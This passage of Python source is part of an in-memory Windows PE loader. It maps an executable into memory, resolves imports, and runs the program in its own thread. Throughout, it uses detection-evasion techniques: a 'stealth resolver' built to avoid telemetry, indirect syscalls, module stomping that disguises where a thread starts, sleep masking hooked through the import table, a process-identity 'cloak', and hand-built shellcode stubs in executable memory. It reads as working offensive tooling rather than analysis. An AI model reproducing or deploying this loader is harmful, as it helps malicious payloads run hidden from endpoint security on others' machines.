        if not all([VirtualAlloc_addr, VirtualProtect_addr, VirtualFree_addr]):
            raise RuntimeError("Failed to resolve required kernel32 functions via stealth resolver")
        
        # Build fallback callables (used when syscall engine unavailable or for ops without Nt equivalents)
        VirtualAlloc = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
        )(VirtualAlloc_addr)
        
        VirtualProtect = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
        )(VirtualProtect_addr)
        
        VirtualFree = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
        )(VirtualFree_addr)
        
        CreateThread = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
            ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
        )(CreateThread_addr) if CreateThread_addr else None
        
        WaitForSingleObject = ctypes.WINFUNCTYPE(
            ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong
        )(WaitForSingleObject_addr) if WaitForSingleObject_addr else None
        
        GetExitCodeThread = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)
        )(GetExitCodeThread_addr) if GetExitCodeThread_addr else None
        
        CloseHandle = ctypes.WINFUNCTYPE(
            ctypes.c_int, ctypes.c_void_p
        )(CloseHandle_addr) if CloseHandle_addr else None

        # ==============================================================
        # ALLOCATE IMAGE MEMORY
        # ==============================================================
        if syscall_eng:
            base_addr_int = syscall_eng.nt_alloc(
                0,                    # Let OS choose address (NULL -> 0)
                self.size_of_image,
                0x3000,               # MEM_COMMIT | MEM_RESERVE
                PAGE_READWRITE
            )
            if not base_addr_int:
                logging.warning("Indirect syscall alloc failed, falling back to VirtualAlloc")
                syscall_eng = None  # Disable for rest of execution
        
        if not syscall_eng or not base_addr_int:
            base_addr = VirtualAlloc(
                None,
                self.size_of_image,
                0x3000,
                PAGE_READWRITE
            )
            if not base_addr:
                error = ctypes.get_last_error()
                raise RuntimeError(f"VirtualAlloc failed with error {error}")
            base_addr_int = base_addr if isinstance(base_addr, int) else ctypes.cast(base_addr, ctypes.c_void_p).value

        logging.info(f"Allocated {self.size_of_image} bytes at 0x{base_addr_int:X}"
                     f"{' [indirect syscall]' if syscall_eng else ''}")

        # Initialize CRT helper with command line
        crt_init = CRTInitializer(base_addr_int, self.stream, self.is_64bit,
                                  self.load_config_rva, self.load_config_size,
                                  command_line=self.command_line)

        try:
            sections_to_protect = []
            header_size = 0x1000

            # Copy headers
            ctypes.memmove(base_addr_int, bytes(self.stream[:header_size]), min(len(self.stream), header_size))

            # Map sections
            current_offset = self.section_header_offset
            for i in range(self.num_sections):
                v_addr = struct.unpack('<I', self.stream[current_offset+12:current_offset+16])[0]
                raw_size = struct.unpack('<I', self.stream[current_offset+16:current_offset+20])[0]
                raw_ptr = struct.unpack('<I', self.stream[current_offset+20:current_offset+24])[0]
                characteristics = struct.unpack('<I', self.stream[current_offset+36:current_offset+40])[0]

                if raw_size > 0 and v_addr > 0:
                    if v_addr + raw_size > self.size_of_image:
                        raise ValueError(f"Section {i} extends beyond image bounds")

                    if raw_ptr + raw_size > len(self.stream):
                        logging.warning(f"Section {i} raw data truncated")
                        raw_size = min(raw_size, len(self.stream) - raw_ptr) if raw_ptr < len(self.stream) else 0

                    if raw_size > 0:
                        dest = base_addr_int + v_addr
                        data = self.stream[raw_ptr:raw_ptr + raw_size]
                        ctypes.memmove(dest, bytes(data), len(data))
                        logging.debug(f"Mapped section {i} at RVA 0x{v_addr:X} ({raw_size} bytes)")

                        sections_to_protect.append({
                            'addr': dest,
                            'size': raw_size,
                            'char': characteristics
                        })

                current_offset += 40

            # Apply relocations if needed
            delta = base_addr_int - self.image_base
            if delta != 0 and self.reloc_table_rva != 0:
                logging.info(f"Applying relocations (delta: 0x{delta:X})")
                self._apply_pe_relocations(base_addr_int, self.reloc_table_rva, self.reloc_table_size, delta)

            # Resolve imports
            if self.import_table_rva != 0:
                logging.info("Resolving imports...")
                # Create SleepMask for annihilation-based sleep masking
                sleep_mask = None
                try:
                    sleep_mask = SleepMask(
                        pe_base=base_addr_int,
                        pe_size=self.size_of_image,
                        sections=sections_to_protect,
                        is_64bit=self.is_64bit,
                    )
                    # FIX 2: Pin to module-level list.  If the PE spawns
                    # background threads that call Sleep() after the main
                    # thread exits, the SleepMask (and its ctypes callbacks)
                    # must not be garbage-collected.
                    _pinned_callbacks.append(sleep_mask)
                except Exception as e:
                    logging.debug(f"SleepMask init failed (non-critical): {e}")
                
                self._resolve_pe_imports(base_addr_int, self.import_table_rva, sleep_mask=sleep_mask)

            # Resolve delay-load imports
            self._resolve_pe_delay_imports(base_addr_int)

            # Execute TLS Callbacks
            self._execute_tls_callbacks(base_addr_int)

            # Setup SEH
            self._setup_seh(base_addr_int)

            # CRT Initialization (while memory is still RW)
            crt_init.initialize()

            # Identity Cloak (optional runtime masquerade)
            identity_cloak = None
            if self.cloak_preset or self.cloak_custom:
                identity_cloak = IdentityCloak(
                    target_name=self.cloak_preset if self.cloak_preset != "custom" else None,
                    custom_config=self.cloak_custom
                )
                identity_cloak.apply()

            # ==============================================================
            # APPLY FINAL SECTION PROTECTIONS
            # ==============================================================
            logging.debug("Applying final section protections...")
            for section in sections_to_protect:
                protection = self._translate_pe_section_protection(section['char'])
                
                if protection != PAGE_NOACCESS:
                    if syscall_eng:
                        success, old_prot = syscall_eng.nt_protect(
                            section['addr'], section['size'], protection
                        )
                        if success:
                            logging.debug(f"  Section at 0x{section['addr']:X}: -> {protection:#x} [indirect syscall]")
                        else:
                            logging.warning(f"  NtProtectVirtualMemory failed for 0x{section['addr']:X}, trying fallback")
                            old_protect = ctypes.c_ulong()
                            VirtualProtect(section['addr'], section['size'], protection, ctypes.byref(old_protect))
                    else:
                        old_protect = ctypes.c_ulong()
                        success = VirtualProtect(
                            section['addr'], section['size'], protection, ctypes.byref(old_protect)
                        )
                        if success:
                            logging.debug(f"  Section at 0x{section['addr']:X}: {old_protect.value:#x} -> {protection:#x}")
                        else:
                            logging.warning(f"  VirtualProtect failed for section at 0x{section['addr']:X}")

            # ==============================================================
            # EXECUTE
            # ==============================================================
            entry_addr = base_addr_int + self.entry_point_rva
            logging.info(f"Jumping to entry point: 0x{entry_addr:X}")

            # Check if DLL or EXE
            pe_offset = struct.unpack('<I', self.stream[0x3C:0x40])[0]
            characteristics = struct.unpack('<H', self.stream[pe_offset+22:pe_offset+24])[0]
            is_dll = bool(characteristics & 0x2000)

            if is_dll:
                logging.info("Detected DLL - calling with DllMain signature")
                ENTRY_FUNC = ctypes.WINFUNCTYPE(
                    ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p
                )
                entry = ENTRY_FUNC(entry_addr)

                try:
                    logging.info(f"Calling DllMain at 0x{entry_addr:X}...")
                    result = entry(base_addr_int, 1, None)
                    logging.info(f"DllMain returned: {result}")
                except Exception as e:
                    logging.error(f"DllMain crashed: {type(e).__name__}: {e}")
                    import traceback
                    traceback.print_exc()
                    raise
            else:
                logging.info("Detected EXE - running in isolated thread")
                INFINITE = 0xFFFFFFFF

                # ==============================================================
                # CREATE THREAD (FIX 12: module stomp → indirect syscall → fallback)
                # ==============================================================
                h_thread_int = 0
                stomp_info = None

                # Priority 1: Module stomping — thread origin in disk-backed DLL
                if syscall_eng:
                    h_thread_int, stomp_info = self._stomp_module_for_thread(
                        entry_addr, resolver, syscall_eng
                    )

                # Priority 2: Direct NtCreateThreadEx (unbacked but indirect syscall)
                if not h_thread_int and syscall_eng:
                    h_thread_int = syscall_eng.nt_create_thread(entry_addr)
                    if h_thread_int:
                        logging.info(f"PE thread started via NtCreateThreadEx (handle: 0x{h_thread_int:X}) [indirect syscall]")
                    else:
                        logging.warning("NtCreateThreadEx failed, falling back to CreateThread")

                # Priority 3: Standard CreateThread (no stealth)
                if not h_thread_int:
                    if not CreateThread:
                        raise RuntimeError("CreateThread not resolved")
                    h_thread = CreateThread(None, 0, entry_addr, None, 0, None)
                    if not h_thread:
                        raise OSError(f"CreateThread failed: {ctypes.get_last_error()}")
                    h_thread_int = h_thread if isinstance(h_thread, int) else ctypes.cast(h_thread, ctypes.c_void_p).value
                    logging.info(f"PE thread started via CreateThread (handle: 0x{h_thread_int:X})")

                logging.info("Waiting for PE thread completion...")

                # ==============================================================
                # WAIT FOR THREAD (indirect syscall or fallback)
                # ==============================================================
                if syscall_eng:
                    wait_status = syscall_eng.nt_wait(h_thread_int, INFINITE)
                    logging.debug(f"NtWaitForSingleObject returned: 0x{wait_status & 0xFFFFFFFF:08X}")
                elif WaitForSingleObject:
                    wait_result = WaitForSingleObject(h_thread_int, INFINITE)

                # Restore stomped DLL bytes now that thread has completed
                if stomp_info:
                    self._restore_stomp(stomp_info)

                # Get exit code (no Nt equivalent needed — low-risk call)
                exit_code = ctypes.c_ulong(0)
                if GetExitCodeThread:
                    GetExitCodeThread(h_thread_int, ctypes.byref(exit_code))
                result = exit_code.value

                # Close thread handle
                if syscall_eng:
                    syscall_eng.nt_close(h_thread_int)
                elif CloseHandle:
                    CloseHandle(h_thread_int)

                logging.info(f"PE thread exited with code: {result}")

            # ==============================================================
            # CLEANUP
            # ==============================================================
            if identity_cloak:
                try:
                    identity_cloak.restore()
                except:
                    pass
            try:
                crt_init.restore()
            except:
                pass

            self._cleanup_allocations(VirtualFree)

            # Free PE image memory
            if syscall_eng:
                syscall_eng.nt_free(base_addr_int)
            else:
                try:
                    VirtualFree(base_addr_int, 0, 0x8000)
                except:
                    pass

            return result

        except Exception as e:
            if identity_cloak:
                try:
                    identity_cloak.restore()
                except:
                    pass
            try:
                crt_init.restore()
            except:
                pass
            self._cleanup_allocations(VirtualFree)
            
            # Free PE image memory on error
            if syscall_eng:
                try:
                    syscall_eng.nt_free(base_addr_int)
                except:
                    pass
            else:
                try:
                    VirtualFree(base_addr_int, 0, 0x8000)
                except:
                    pass
            
            logging.error(f"PE execution failed: {e}")
            raise

    def _cleanup_allocations(self, VirtualFree=None):
        """Free all tracked VirtualAlloc allocations to prevent memory leaks."""
        if not self._allocations:
            return
        
        # Use cached or provided VirtualFree
        free_func = VirtualFree or self._VirtualFree
        if not free_func:
            logging.warning(f"Cannot free {len(self._allocations)} allocations - VirtualFree not available")
            return
        
        MEM_RELEASE = 0x8000
        freed_count = 0
        
        for addr in self._allocations:
            try:
                if addr:
                    free_func(addr, 0, MEM_RELEASE)
                    freed_count += 1
            except Exception as e:
                logging.debug(f"Failed to free allocation at 0x{addr:X}: {e}")
        
        if freed_count > 0:
            logging.debug(f"Freed {freed_count} hook/stub allocations")
        
        self._allocations.clear()

    def _apply_pe_relocations(self, base_addr, reloc_rva, reloc_size, delta):
        """
        Parses .reloc section and patches memory addresses.
        
        Includes bounds checking to prevent writes outside the allocated image region.
        """
        current_rva = reloc_rva
        end_rva = reloc_rva + reloc_size
        
        # Define valid address range for bounds checking
        image_start = base_addr
        image_end = base_addr + self.size_of_image
        
        def read_mem_u32(addr):
            return struct.unpack('<I', ctypes.string_at(addr, 4))[0]
        
        reloc_count = 0
        skipped_oob = 0
        
        while current_rva < end_rva:
            block_va = read_mem_u32(base_addr + current_rva)
            block_size = read_mem_u32(base_addr + current_rva + 4)
            
            if block_size == 0:
                break
            
            # Validate block_size is sane
            if block_size < 8 or block_size > (end_rva - current_rva + 8):
                logging.warning(f"Invalid relocation block size {block_size} at RVA 0x{current_rva:X}, stopping")
                break
            
            num_entries = (block_size - 8) // 2
            entry_ptr = base_addr + current_rva + 8
            
            for _ in range(num_entries):
                entry = struct.unpack('<H', ctypes.string_at(entry_ptr, 2))[0]
                entry_ptr += 2
                
                type_ = entry >> 12
                offset = entry & 0xFFF
                
                target_addr = base_addr + block_va + offset
                
                if type_ == 3:  # IMAGE_REL_BASED_HIGHLOW (32-bit)
                    # BOUNDS CHECK: target + 4 bytes must be within image
                    if not (image_start <= target_addr and target_addr + 4 <= image_end):
                        logging.debug(f"Relocation target 0x{target_addr:X} out of bounds (32-bit), skipping")
                        skipped_oob += 1
                        continue
                    curr_val = struct.unpack('<I', ctypes.string_at(target_addr, 4))[0]
                    new_val = (curr_val + delta) & 0xFFFFFFFF
                    ctypes.memmove(target_addr, struct.pack('<I', new_val), 4)
                    reloc_count += 1
                    
                elif type_ == 10:  # IMAGE_REL_BASED_DIR64 (64-bit)
                    # BOUNDS CHECK: target + 8 bytes must be within image
                    if not (image_start <= target_addr and target_addr + 8 <= image_end):
                        logging.debug(f"Relocation target 0x{target_addr:X} out of bounds (64-bit), skipping")
                        skipped_oob += 1
                        continue
                    curr_val = struct.unpack('<Q', ctypes.string_at(target_addr, 8))[0]
                    new_val = (curr_val + delta) & 0xFFFFFFFFFFFFFFFF
                    ctypes.memmove(target_addr, struct.pack('<Q', new_val), 8)
                    reloc_count += 1
            
            current_rva += block_size
        
        if skipped_oob > 0:
            logging.warning(f"Skipped {skipped_oob} out-of-bounds relocations")
        logging.debug(f"Applied {reloc_count} relocations")

    def _setup_argv_hooks(self):
        """Create hook stubs for __p___argc and __p___argv that return our custom arguments.
        
        All allocations are tracked in self._allocations for cleanup.
        """
        if not self.command_line:
            return None, None
        
        # Parse command line into argc/argv
        # Simple split on spaces (doesn't handle quotes, but good enough for now)
        args = self.command_line.split()
        argc = len(args)
        
        logging.info(f"Setting up argv hooks: argc={argc}, argv={args}")
        
        resolver = get_stealth_resolver()
        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
        
        if not VirtualAlloc_addr:
            logging.error("Failed to resolve VirtualAlloc for argv hooks")
            return None, None
        
        VirtualAlloc = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
        )(VirtualAlloc_addr)
        
        # Cache VirtualFree for cleanup
        if VirtualFree_addr and not self._VirtualFree:
            self._VirtualFree = ctypes.WINFUNCTYPE(
                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
            )(VirtualFree_addr)
        
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_READWRITE_LOCAL = 0x04
        PAGE_EXECUTE_READWRITE_LOCAL = 0x40
        
        # Calculate total size needed
        # - 8 bytes for argc (4 byte int + 4 padding for alignment)
        # - 8 bytes per argv pointer + null terminator
        # - String data
        string_data_size = sum(len(arg) + 1 for arg in args)  # +1 for null terminator each
        argv_array_size = (argc + 1) * 8  # +1 for NULL terminator, 8 bytes per pointer (x64)
        total_size = 8 + argv_array_size + string_data_size + 64  # +64 padding
        
        # Allocate data memory
        data_mem = VirtualAlloc(None, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE_LOCAL)
        if not data_mem:
            logging.error("Failed to allocate memory for argv data")
            return None, None
        
        data_mem_int = data_mem if isinstance(data_mem, int) else ctypes.cast(data_mem, ctypes.c_void_p).value
        self._allocations.append(data_mem_int)  # Track for cleanup
        
        # Layout:
        # [0:4] = argc (int, 4 bytes)
        # [8:8+argv_array_size] = argv array (char**) - start at offset 8 for alignment
        # [8+argv_array_size:] = string data
        
        argc_ptr = data_mem_int
        argv_array_ptr = data_mem_int + 8
        string_ptr = data_mem_int + 8 + argv_array_size
        
        # Write argc as 4-byte int
        ctypes.memmove(argc_ptr, struct.pack('<i', argc), 4)
        
        # Write strings and build argv array
        current_string_ptr = string_ptr
        for i, arg in enumerate(args):
            # Write the string
            arg_bytes = arg.encode('ascii') + b'\x00'
            ctypes.memmove(current_string_ptr, arg_bytes, len(arg_bytes))
            
            # Write pointer to this string in argv array
            ctypes.memmove(argv_array_ptr + i * 8, struct.pack('<Q', current_string_ptr), 8)
            
            current_string_ptr += len(arg_bytes)
        
        # Write NULL terminator for argv array
        ctypes.memmove(argv_array_ptr + argc * 8, struct.pack('<Q', 0), 8)
        
        # Store for later reference (prevent garbage collection issues)
        self._argc_ptr = argc_ptr
        self._argv_ptr = argv_array_ptr
        self._argv_data_mem = data_mem_int
        
        # Now create the hook stubs
        # __p___argc returns int* (pointer to argc)
        # __p___argv returns char*** (pointer to argv)
        
        # For x64:
        # mov rax, <address>
        # ret
        
        # Hook for __p___argc - returns pointer to argc
        argc_stub = b'\x48\xB8' + struct.pack('<Q', argc_ptr) + b'\xC3'
        
        # Hook for __p___argv - returns pointer to argv pointer
        # We need to return a pointer TO the argv array pointer
        # So we need another level of indirection
        # Allocate 8 bytes to hold the argv_array_ptr value
        argv_ptr_ptr = VirtualAlloc(None, 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE_LOCAL)
        argv_ptr_ptr_int = argv_ptr_ptr if isinstance(argv_ptr_ptr, int) else ctypes.cast(argv_ptr_ptr, ctypes.c_void_p).value
        ctypes.memmove(argv_ptr_ptr_int, struct.pack('<Q', argv_array_ptr), 8)
        self._argv_ptr_ptr = argv_ptr_ptr_int
        self._allocations.append(argv_ptr_ptr_int)  # Track for cleanup
        
        argv_stub = b'\x48\xB8' + struct.pack('<Q', argv_ptr_ptr_int) + b'\xC3'
        
        # Allocate executable memory for stubs
        argc_hook = VirtualAlloc(None, len(argc_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
        argv_hook = VirtualAlloc(None, len(argv_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
        
        argc_hook_int = argc_hook if isinstance(argc_hook, int) else ctypes.cast(argc_hook, ctypes.c_void_p).value if argc_hook else 0
        argv_hook_int = argv_hook if isinstance(argv_hook, int) else ctypes.cast(argv_hook, ctypes.c_void_p).value if argv_hook else 0
        
        if argc_hook_int:
            ctypes.memmove(argc_hook_int, argc_stub, len(argc_stub))
            self._allocations.append(argc_hook_int)  # Track for cleanup
            logging.info(f"Created __p___argc hook at 0x{argc_hook_int:X}")
        
        if argv_hook_int:
            ctypes.memmove(argv_hook_int, argv_stub, len(argv_stub))
            self._allocations.append(argv_hook_int)  # Track for cleanup
            logging.info(f"Created __p___argv hook at 0x{argv_hook_int:X}")
        
        return argc_hook_int, argv_hook_int

    def _create_exit_hook(self):
        """Create a hook stub for exit() that calls _cexit() then ExitThread.
        
        This prevents CRT state corruption by:
        1. Calling _cexit() to flush buffers and release locks (without closing handles)
        2. Then calling ExitThread() to terminate just the PE thread
        
        All allocations are tracked in self._allocations for cleanup.
        
        x64 Assembly:
            sub rsp, 0x28           ; Align stack (shadow space)
            mov rax, <_cexit>       ; Load _cexit address
            call rax                ; Call _cexit (flushes buffers, releases locks)
            add rsp, 0x28           ; Restore stack
            xor rcx, rcx            ; Exit code 0
            mov rax, <ExitThread>   ; Load ExitThread address
            jmp rax                 ; Jump to ExitThread
        """
        resolver = get_stealth_resolver()
        
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE_LOCAL = 0x40
        
        # Get ExitThread address via stealth resolver
        exit_thread_addr = resolver.get_proc_address("kernel32.dll", "ExitThread")
        
        if not exit_thread_addr:
            logging.error("Failed to get ExitThread address")
            return None
        
        # Get VirtualAlloc for allocating our stub
        VirtualAlloc_addr = resolver.get_proc_address("kernel32.dll", "VirtualAlloc")
        VirtualFree_addr = resolver.get_proc_address("kernel32.dll", "VirtualFree")
        
        if not VirtualAlloc_addr:
            logging.error("Failed to resolve VirtualAlloc for exit hook")
            return None
        
        VirtualAlloc = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong
        )(VirtualAlloc_addr)
        
        # Cache VirtualFree for cleanup
        if VirtualFree_addr and not self._VirtualFree:
            self._VirtualFree = ctypes.WINFUNCTYPE(
                ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong
            )(VirtualFree_addr)
        
        # Get _cexit address - need to load ucrtbase first
        cexit_addr = None
        ucrt_base = resolver.load_library("ucrtbase.dll")
        if ucrt_base:
            cexit_addr = resolver.get_proc_address("ucrtbase.dll", "_cexit")
        
        if not cexit_addr:
            # Try api-ms-win-crt-runtime
            ucrt_base = resolver.load_library("api-ms-win-crt-runtime-l1-1-0.dll")
            if ucrt_base:
                cexit_addr = resolver.get_proc_address("api-ms-win-crt-runtime-l1-1-0.dll", "_cexit")
        
        if not cexit_addr:
            logging.warning("Could not find _cexit, falling back to direct ExitThread")
        
        if cexit_addr:
            # Safe exit stub: _cexit() then ExitThread()
            shellcode = (
                b'\x48\x83\xEC\x28'                              # sub rsp, 0x28 (align stack)
                + b'\x48\xB8' + struct.pack('<Q', cexit_addr)    # mov rax, _cexit
                + b'\xFF\xD0'                                    # call rax
                + b'\x48\x83\xC4\x28'                            # add rsp, 0x28
                + b'\x48\x31\xC9'                                # xor rcx, rcx (exit code 0)
                + b'\x48\xB8' + struct.pack('<Q', exit_thread_addr)  # mov rax, ExitThread
                + b'\xFF\xE0'                                    # jmp rax
            )
            logging.info(f"Created safe exit hook: _cexit(0x{cexit_addr:X}) -> ExitThread(0x{exit_thread_addr:X})")
        else:
            # Fallback: direct ExitThread (may still cause issues)
            shellcode = b'\x48\xB8' + struct.pack('<Q', exit_thread_addr) + b'\xFF\xE0'
            logging.warning(f"Created fallback exit hook -> ExitThread(0x{exit_thread_addr:X})")
        
        # Allocate executable memory for the stub
        stub_addr = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE_LOCAL)
        
        if stub_addr:
            stub_addr_int = stub_addr if isinstance(stub_addr, int) else ctypes.cast(stub_addr, ctypes.c_void_p).value
            ctypes.memmove(stub_addr_int, shellcode, len(shellcode))
            self._allocations.append(stub_addr_int)  # Track for cleanup
            logging.info(f"Exit hook stub at 0x{stub_addr_int:X}")
            return stub_addr_int
        
        logging.error("Failed to allocate memory for exit hook")
        return None

    def _resolve_pe_imports(self, base_addr, import_rva, sleep_mask=None):
        """
        Walks Import Descriptor, loads DLLs, fills IAT.
        Uses StealthResolver to avoid ctypes.windll telemetry.
        """
        resolver = get_stealth_resolver()
        
        # Get function addresses we need through stealth resolution
        LoadLibraryA_addr = resolver.get_proc_address("kernel32.dll", "LoadLibraryA")
        GetProcAddress_addr = resolver.get_proc_address("kernel32.dll", "GetProcAddress")
        
        if not LoadLibraryA_addr or not GetProcAddress_addr:
            logging.error("Failed to resolve LoadLibraryA/GetProcAddress via stealth resolver")
            return
        
        # Create callable function pointers using WINFUNCTYPE for Windows API calling convention
        LoadLibraryA = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_char_p)(LoadLibraryA_addr)
        GetProcAddress_by_name = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p)(GetProcAddress_addr)
        # For ordinal, use c_void_p to ensure pointer-sized argument (ordinal passed as low bits)
        GetProcAddress_by_ord = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)(GetProcAddress_addr)
        
        # Set up argv hooks if we have a custom command line
        argc_hook = None
        argv_hook = None
        if self.command_line:
            argc_hook, argv_hook = self._setup_argv_hooks()
        
        # Create exit hook to prevent CRT cleanup from corrupting Python
        exit_hook = self._create_exit_hook()
        
        desc_ptr = base_addr + import_rva
        dll_count = 0
        
        while True:
            original_first_thunk = struct.unpack('<I', ctypes.string_at(desc_ptr, 4))[0]
            name_rva = struct.unpack('<I', ctypes.string_at(desc_ptr + 12, 4))[0]
            first_thunk = struct.unpack('<I', ctypes.string_at(desc_ptr + 16, 4))[0]
            
            if original_first_thunk == 0 and name_rva == 0:
                break
                
            # Get DLL Name
            dll_name = ctypes.string_at(base_addr + name_rva).decode('ascii')
            h_module = LoadLibraryA(dll_name.encode('ascii'))
            if not h_module:
                # Check if this is a critical system DLL that should always be available
                critical_dlls = {'kernel32.dll', 'ntdll.dll', 'user32.dll', 'advapi32.dll', 
                                 'msvcrt.dll', 'ucrtbase.dll', 'vcruntime140.dll'}
                dll_lower = dll_name.lower()
                
                if dll_lower in critical_dlls:
                    raise RuntimeError(f"Failed to load critical dependency: {dll_name} - binary cannot execute")
                else:
                    logging.warning(f"Failed to load dependency: {dll_name} - some functionality may not work")
                    desc_ptr += 20
                    continue
            
            h_module_int = h_module if isinstance(h_module, int) else ctypes.cast(h_module, ctypes.c_void_p).value
            dll_count += 1
            logging.debug(f"Loaded DLL: {dll_name} at 0x{h_module_int:X}")
                
            # Walk Thunks
            thunk_ptr = base_addr + (original_first_thunk if original_first_thunk else first_thunk)
            iat_ptr = base_addr + first_thunk
            
            is_64 = (self.image_base > 0xFFFFFFFF)
            ptr_size = 8 if is_64 else 4
            msb_mask = 0x8000000000000000 if is_64 else 0x80000000
            
            import_count = 0
            failed_imports = []
            
            while True:
                if is_64:
                    thunk_data = struct.unpack('<Q', ctypes.string_at(thunk_ptr, 8))[0]
                else:
                    thunk_data = struct.unpack('<I', ctypes.string_at(thunk_ptr, 4))[0]
                
                if thunk_data == 0:
                    break
                
                if thunk_data & msb_mask:
                    # Import by ordinal
                    ordinal = thunk_data & 0xFFFF
                    proc_addr = GetProcAddress_by_ord(h_module_int, ordinal)
                else:
                    # Import by name
                    name_ptr = base_addr + (thunk_data & 0x7FFFFFFF) + 2
                    func_name_bytes = ctypes.string_at(name_ptr)
                    dll_lower = dll_name.lower()
                    
                    # IAT HOOK: Swap ExitProcess -> ExitThread to keep host process alive
                    if dll_lower == 'kernel32.dll' and func_name_bytes == b'ExitProcess':
                        logging.debug("IAT Hook: Redirecting ExitProcess -> ExitThread")
                        proc_addr = GetProcAddress_by_name(h_module_int, b'ExitThread')
                    
                    # IAT HOOK: exit/_exit/quick_exit -> ExitThread (prevent CRT cleanup)
                    elif func_name_bytes in (b'exit', b'_exit', b'quick_exit', b'_Exit') and exit_hook:
                        logging.info(f"IAT Hook: Redirecting {func_name_bytes.decode()} -> ExitThread")
                        proc_addr = exit_hook
                    
                    # IAT HOOK: __p___argc -> our hook (returns pointer to custom argc)
                    elif func_name_bytes == b'__p___argc' and argc_hook:
                        logging.info(f"IAT Hook: Redirecting __p___argc -> 0x{argc_hook:X}")
                        proc_addr = argc_hook
                    
                    # IAT HOOK: __p___argv -> our hook (returns pointer to custom argv)
                    elif func_name_bytes == b'__p___argv' and argv_hook:
                        logging.info(f"IAT Hook: Redirecting __p___argv -> 0x{argv_hook:X}")
                        proc_addr = argv_hook
                    

                    # IAT HOOK: Sleep -> SleepMask callback (annihilation sleep masking)
                    elif dll_lower == 'kernel32.dll' and func_name_bytes == b'Sleep' and sleep_mask:
                        sleep_hook_addr = sleep_mask.create_sleep_hook()
                        if sleep_hook_addr:
                            logging.info(f"IAT Hook: Redirecting Sleep -> SleepMask @ 0x{sleep_hook_addr:X}")
                            proc_addr = sleep_hook_addr
                        else:
                            proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
                    
                    # IAT HOOK: SleepEx -> SleepMask callback
                    elif dll_lower == 'kernel32.dll' and func_name_bytes == b'SleepEx' and sleep_mask:
                        sleep_ex_hook_addr = sleep_mask.create_sleep_ex_hook()
                        if sleep_ex_hook_addr:
                            logging.info(f"IAT Hook: Redirecting SleepEx -> SleepMask @ 0x{sleep_ex_hook_addr:X}")
                            proc_addr = sleep_ex_hook_addr
                        else:
                            proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
                    
                    else:
                        proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
                
                if proc_addr:
                    proc_addr_int = proc_addr if isinstance(proc_addr, int) else ctypes.cast(proc_addr, ctypes.c_void_p).value
                    if is_64:
                        ctypes.memmove(iat_ptr, struct.pack('<Q', proc_addr_int), 8)
                    else:
                        ctypes.memmove(iat_ptr, struct.pack('<I', proc_addr_int), 4)
                    import_count += 1
                else:
                    # Track failed imports for summary
                    if thunk_data & msb_mask:
                        failed_imports.append(f"{dll_name}!Ordinal{thunk_data & 0xFFFF}")
                    else:
                        try:
                            name_ptr = base_addr + (thunk_data & 0x7FFFFFFF) + 2
                            func_name = ctypes.string_at(name_ptr).decode('ascii', errors='ignore')
                            failed_imports.append(f"{dll_name}!{func_name}")
                        except:
                            failed_imports.append(f"{dll_name}!<unknown>")
                
                thunk_ptr += ptr_size
                iat_ptr += ptr_size
            
            # Report failed imports for this DLL
            if failed_imports:
                logging.warning(f"  {dll_name}: {len(failed_imports)} unresolved imports: {', '.join(failed_imports[:5])}" + 
                              (f" (and {len(failed_imports)-5} more)" if len(failed_imports) > 5 else ""))
            
            logging.debug(f"  Resolved {import_count} imports from {dll_name}")
            desc_ptr += 20
        
        logging.info(f"Loaded {dll_count} DLLs via stealth resolver")

    def _execute_tls_callbacks(self, base_addr):
        """Finds and executes Thread Local Storage callbacks."""
        if not hasattr(self, 'tls_directory_rva') or self.tls_directory_rva == 0:
            return

        logging.info("Processing TLS Callbacks...")
        
        # Read IMAGE_TLS_DIRECTORY
        tls_ptr = base_addr + self.tls_directory_rva
        
        if self.image_base > 0xFFFFFFFF:  # 64-bit
            callbacks_va = struct.unpack('<Q', ctypes.string_at(tls_ptr + 24, 8))[0]
        else:  # 32-bit
            callbacks_va = struct.unpack('<I', ctypes.string_at(tls_ptr + 12, 4))[0]

        if callbacks_va == 0:
            return

        # Convert VA to RVA
        callbacks_rva = callbacks_va - self.image_base
        
        # Validate RVA is within bounds
        if callbacks_rva < 0 or callbacks_rva >= self.size_of_image:
